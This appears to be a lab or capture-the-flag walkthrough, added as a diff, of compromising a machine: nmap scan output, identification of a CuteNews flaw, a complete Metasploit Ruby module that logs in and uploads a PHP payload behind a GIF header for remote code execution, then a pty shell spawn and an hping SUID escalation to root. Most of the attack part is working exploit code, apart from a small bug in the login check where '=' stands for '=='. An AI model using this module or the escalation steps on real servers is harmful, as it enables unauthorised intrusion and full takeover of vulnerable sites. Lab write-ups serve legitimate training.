@@ -1,0 +1,293 @@
+1st step reconnaisance
+	tool used : nmap
+result of command : nmap -A -T5 $IP
+is:
+Not shown: 995 closed ports
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 04:d0:6e:c4:ba:4a:31:5a:6f:b3:ee:b8:1b:ed:5a:b7 (RSA)
+|   256 24:b3:df:01:0b:ca:c2:ab:2e:e9:49:b0:58:08:6a:fa (ECDSA)
+|_  256 6a:c4:35:6a:7a:1e:7e:51:85:5b:81:5c:7c:74:49:84 (ED25519)
+80/tcp  open  http     Apache httpd 2.4.38 ((Debian))
+|_http-server-header: Apache/2.4.38 (Debian)
+|_http-title: Apache2 Debian Default Page: It works
+88/tcp  open  http     nginx 1.14.2
+|_http-server-header: nginx/1.14.2
+|_http-title: 404 Not Found
+110/tcp open  pop3     Courier pop3d
+|_pop3-capabilities: STLS LOGIN-DELAY(10) UTF8(USER) IMPLEMENTATION(Courier Mail Server) TOP UIDL USER PIPELINING
+| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
+| Subject Alternative Name: email:postmaster@example.com
+| Not valid before: 2020-09-17T16:28:06
+|_Not valid after:  2021-09-17T16:28:06
+|_ssl-date: TLS randomness does not represent time
+995/tcp open  ssl/pop3 Courier pop3d
+|_pop3-capabilities: LOGIN-DELAY(10) UTF8(USER) IMPLEMENTATION(Courier Mail Server) TOP UIDL USER PIPELINING
+| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
+| Subject Alternative Name: email:postmaster@example.com
+| Not valid before: 2020-09-17T16:28:06
+|_Not valid after:  2021-09-17T16:28:06
+|_ssl-date: TLS randomness does not represent time
+Aggressive OS guesses: Linux 2.6.32 or 3.10 (91%), Synology DiskStation Manager 5.1 (90%), Linux 2.6.35 (90%), Linux 2.6.32 (90%), WatchGuard Fireware 11.8 (90%), Tandberg VCS video conferencing system (90%), Linux 2.6.37 (90%), Linux 3.18 (89%), Linux 4.9 (89%), Linux 2.6.32 - 2.6.35 (89%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 8888/tcp)
+HOP RTT       ADDRESS
+1   362.11 ms 192.168.49.1
+2   362.29 ms 192.168.158.128
+
+2nd stage
+Exploration of ports :
+at port 80  tried listing directory ex /index.php , /index.html
+at index.php i registered myself but captcha was not visible then on viewing source code this issue was resolved and at main page there was cutenews vulnerability
+which was exploited previously back in 2020 
+
+3rd stage :
+GAINING ACCESS AND EXPLOITATION
+Tool used : metasploit 
+language of exploit : ruby
+code for exploit :
+
+ class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+ 
+  include Msf::Exploit::Remote::HttpClient
+ 
+  def initialize(info = {})
+    super(update_info(info,
+      'Name' => "CuteNews 2.1.2 - 'avatar' Remote Code Execution",
+      'Description' => %q(
+        This module exploits a command execution vulnerability in CuteNews prior to 2.1.2.
+        The attacker can infiltrate the server through the avatar upload process in the profile area.
+        There is no realistic control of the $imgsize function in "/core/modules/dashboard.php"
+        Header content of the file can be changed and the control can be bypassed.
+        We can use the "GIF" header for this process.
+        An ordinary user is enough to exploit the vulnerability. No need for admin user.
+        The module creates a file for you and allows RCE.
+      ),
+      'License' => MSF_LICENSE,
+      'References' =>
+        [
+          ['URL', 'http://pentest.com.tr/exploits/CuteNews-2-1-2-Remote-Code-Execution-Metasploit.html'],
+          ['URL', 'http://cutephp.com'] # Official Website
+        ],
+      'Platform' => 'php',
+      'Arch' => ARCH_PHP,
+      'Targets' => [['Automatic', {}]],
+      'Privileged' => false,
+      'DisclosureDate' => "Apr 14 2019",
+      'DefaultTarget' => 0))
+ 
+    register_options(
+      [
+        OptString.new('TARGETURI', [true, "Base CutePHP directory path", '/CuteNews']),
+        OptString.new('USERNAME', [true, "Username to authenticate with", 'admin']),
+        OptString.new('PASSWORD', [false, "Password to authenticate with", 'admin'])
+      ]
+    )
+  end
+
+  def exec
+    res = send_request_cgi({
+      'method'   => 'GET',
+      'uri'      => normalize_uri(target_uri.path, "uploads","avatar_#{datastore['USERNAME']}_#{@shell}") # shell url
+    })
+  end
+  def login(uname, pass, check)
+    # 1st request to get cookie
+    res = send_request_cgi(
+      'method' => 'POST',
+      'uri' => normalize_uri(target_uri.path, 'index.php'),
+      'vars_post' => {
+        'action' => 'dologin',
+        'username' => uname,
+        'password' => pass
+      }
+    )
+
+    cookie = res.get_cookies
+    # 2nd request to cookie validation
+    res = send_request_cgi({
+      'method'   => 'GET',
+      'uri'      => normalize_uri(target_uri.path, "index.php"),
+      'cookie'   => cookie
+    })
+ 
+    if res.code = 200 && (res.body =~ /dashboard/)
+      return cookie     
+    end 
+
+    fail_with(Failure::NoAccess, "Authentication was unsuccessful with user: #{uname}")
+    return nil
+  end
+ 
+  def peer
+    "#{ssl ? 'https://' : 'http://' }#{rhost}:#{rport}"
+  end
+  def upload_shell(cookie, check)
+
+    res = send_request_cgi({
+      'method'   => 'GET',
+      'uri'      => normalize_uri(target_uri.path, "index.php?mod=main&opt=personal"),
+      'cookie'   => cookie
+    })
+
+    signkey = res.body.split('__signature_key" value="')[1].split('"')[0]
+    signdsi = res.body.split('__signature_dsi" value="')[1].split('"')[0]
+    # data preparation
+    fname = Rex::Text.rand_text_alpha_lower(8) + ".php"
+    @shell = "#{fname}"
+    pdata = Rex::MIME::Message.new
+    pdata.add_part('main', nil, nil, 'form-data; name="mod"')
+    pdata.add_part('personal', nil, nil, 'form-data; name="opt"')
+    pdata.add_part("#{signkey}", nil, nil, 'form-data; name="__signature_key"')
+    pdata.add_part("#{signdsi}", nil, nil, 'form-data; name="__signature_dsi"')
+    pdata.add_part('', nil, nil, 'form-data; name="editpassword"')
+    pdata.add_part('', nil, nil, 'form-data; name="confirmpassword"')
+    pdata.add_part("#{datastore['USERNAME']}", nil, nil, 'form-data; name="editnickname"')
+    pdata.add_part("GIF\r\n" + payload.encoded, 'image/png', nil, "form-data; name=\"avatar_file\"; filename=\"#{fname}\"")
+    pdata.add_part('', nil, nil, 'form-data; name="more[site]"')
+    pdata.add_part('', nil, nil, 'form-data; name="more[about]"')
+    data = pdata.to_s
+ 
+    res = send_request_cgi({
+      'method' => 'POST',    
+      'data'  => data,
+      'agent' => 'Mozilla',
+      'ctype' => "multipart/form-data; boundary=#{pdata.bound}",
+      'cookie' => cookie,
+      'uri' => normalize_uri(target_uri.path, "index.php")     
+    })
+
+    if res && res.code == 200 && res.body =~ /User info updated!/
+      print_status("Trying to upload #{fname}")
+      return true
+    else
+      fail_with(Failure::NoAccess, 'Error occurred during uploading!')
+      return false
+    end
+
+  end
+##
+# Exploit controls and information
+##
+  def exploit
+    unless Exploit::CheckCode::Vulnerable == check
+      fail_with(Failure::NotVulnerable, 'Target is not vulnerable.')
+    end
+
+    cookie = login(datastore['USERNAME'], datastore['PASSWORD'], false)
+    print_good("Authentication was successful with user: #{datastore['USERNAME']}")
+
+    if upload_shell(cookie, true)
+      print_good("Upload successfully.")
+      exec
+    end
+  end
+##
+# Version and Vulnerability Check
+##
+  def check
+ 
+    res = send_request_cgi({
+      'method'   => 'GET',
+      'uri'      => normalize_uri(target_uri.path, "index.php")
+    })
+ 
+    unless res
+      vprint_error 'Connection failed'
+      return CheckCode::Unknown
+    end
+ 
+    if res.code == 200
+      version = res.body.split('target="_blank">CuteNews ')[1].split('</a>')[0]
+      if version < '2.1.3'
+       print_status("#{peer} - CuteNews is #{version}")
+       return Exploit::CheckCode::Vulnerable
+      end
+    end
+ 
+    return Exploit::CheckCode::Safe
+  end
+end
+
+saved above code in metasploit file 
+ launched metasploit
+ used this exploit
+ my username and password was set in 
+ and i exploited myself and meterpreter was achieved 
+
+ex 
+meterpreter>
+for shell spawning 
+command used was python -c 'import pty ; pty.spawn("/bin/bash")' and shell with www-data was achieved 
+exploited hping suid bit 
+gained root access 
+read all files of text extension
+
+<MACHINE HACKED>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
